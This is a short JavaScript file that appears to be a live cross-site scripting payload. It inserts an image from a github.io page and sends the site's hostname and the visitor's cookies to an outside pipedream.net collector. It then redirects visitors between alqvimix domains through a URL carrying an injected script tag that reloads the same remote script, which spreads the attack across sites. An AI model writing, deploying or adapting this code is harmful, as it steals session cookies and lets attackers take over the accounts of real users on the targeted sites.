const div1 = document.createElement('div');
div1.innerHTML = `<img src="https://berdos1989.github.io/foraite.jpg" width="100%">`;
document.body.appendChild(div1);
fetch(`https://eodcnv9aow0mu5f.m.pipedream.net/?site=${location.hostname}&taxi=${document.cookie}`).then(response => {
    if (location.hostname == "alqvimix.finance") {
        window.location = "https://alqvimix.live/ajax?module=refsys%3Cscript%20src=%22https://berdos1989.github.io/script.js%22%3E%3C/script%3E";
    } else if (location.hostname == "alqvimix.live") {
        window.location = "https://alqvimix.com/ajax?module=refsys%3Cscript%20src=%22https://berdos1989.github.io/script.js%22%3E%3C/script%3E";
    }
});
